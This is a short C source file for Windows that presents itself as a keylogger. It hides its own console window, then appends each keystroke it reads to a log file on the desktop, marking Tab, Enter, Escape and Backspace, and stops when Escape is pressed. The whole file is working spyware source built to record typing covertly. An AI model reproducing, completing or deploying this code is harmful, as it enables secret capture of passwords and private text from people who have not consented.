#include <stdio.h>
#include <conio.h>
#include <windows.h>
#include <time.h>
#define PATH "C:/Users/acer/Desktop/test-log.txt" // The path to the log file

int main()
{
    char capture;
    FILE *file;
    time_t t;
    t = time(NULL);
    HWND window;
    AllocConsole();
    window=GetConsoleWindow(); // window=FindWindowA("ConsoleWindowClass",NULL);
    ShowWindow(window,0); //hide window
    file = fopen(PATH, "a+");
    fprintf(file, "\n#$KeyLogger: Written by Bigyan. Started logging @ %s", ctime(&t));

    while(1)
    {
        if (kbhit())
        {
            capture = getch();
            switch ((int)capture)
            {
                case ' ': // Space key
                    fprintf(file, " ");
                    break;
                case 0x09: // Tab key.
                    fprintf(file, "[TAB]");
                    break;
                case 0x0D: // Enter key.
                    fprintf(file, "[ENTER]");
                    break;
                case 0x1B: // Escape key.
                    fprintf(file, "[ESC]");
                    break;
                case 0x08: // Backspace key.
                    fprintf(file, "[BACKSPACE]");
                    break;
                default:
                    fputc(capture,file); // Put any other inputted key into the file.
            }

            if ( (int) capture == 27 )
                {//ESCAPE key
                fclose(file);
                return 0;
                }
        }
     }

}
